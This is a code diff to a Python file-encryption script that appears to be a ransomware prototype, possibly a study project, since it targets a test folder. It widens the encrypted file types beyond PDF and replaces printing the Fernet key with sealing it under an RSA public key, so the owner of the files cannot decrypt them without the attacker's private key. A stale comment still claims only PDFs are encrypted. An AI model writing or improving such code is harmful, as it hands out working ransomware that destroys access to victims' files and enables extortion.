@@ -11,6 +11,8 @@ from cryptography.fernet import Fernet
 import os
 import threading
 import mimetypes
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import padding
 
 # encrypt é a função responsável por encriptar cada arquivo usando o AES e a key gerada.
 def encrypt(file, key):
@@ -42,9 +44,9 @@ def listdir(path): # Irá listar os diretórios recursivamente até encontrar to
 global whitelist
 
 files = []
-whitelist = ["application/pdf"] # Encripta apenas arquivos pdf.
+whitelist = ["application/pdf", "image/jpeg", "image/png", "text/plain"] # Encripta apenas arquivos pdf.
 dirs = []
-listdir("./") # Pega apenas os arquivos da pasta do script.
+listdir("./arquivos_teste/") # Pega apenas os arquivos da pasta do script.
 
 if len(dirs) > 0:
     threads = []
@@ -57,7 +59,23 @@ if len(dirs) > 0:
         t.join()
 
 key = Fernet.generate_key()
-print(key) # IMPORTANTE! Usar a key printada em console para descriptar os arquivos
+# Criptografar a chave Fernet com RSA-2048
+with open("public_key.pem", "rb") as f:
+    public_key = serialization.load_pem_public_key(f.read())
+
+enc_key = public_key.encrypt(
+    key,
+    padding.OAEP(
+        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+        algorithm=hashes.SHA256(),
+        label=None
+    )
+)
+
+# Salvar a chave encriptada
+with open("key.bin.enc", "wb") as f:
+    f.write(enc_key)
+
 for file in files:
     t = threading.Thread(target=encrypt, args=(file, key,))
     t.start()
